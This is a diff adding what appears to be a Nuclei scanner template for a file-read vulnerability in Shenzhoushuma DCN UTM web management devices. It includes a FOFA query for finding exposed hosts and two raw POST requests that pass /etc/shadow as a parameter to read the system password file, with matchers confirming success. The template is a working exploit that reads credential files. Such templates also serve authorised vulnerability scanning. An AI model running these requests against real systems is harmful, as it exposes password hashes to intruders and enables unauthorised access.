@@ -1,0 +1,36 @@
+id: shenzhoushuma-dcn-file-read
+
+info:
+  name: Shenzhoushuma DCN File Read
+  author: zp857
+  severity: high
+  tags: shenzhoushuma,lfi
+  metadata:
+    fofa-query: 'body="DCN-UTM-Web-Management"'
+
+requests:
+  - raw:
+      - |
+        POST /function/auth/user/online_list.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        proxy_request=/etc/shadow
+
+      - |
+        POST /webAuth/login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        target=/etc/shadow
+
+    matchers-condition: and
+    matchers:
+
+      - type: word
+        words:
+          - "root"
+
+      - type: status
+        status:
+          - 200
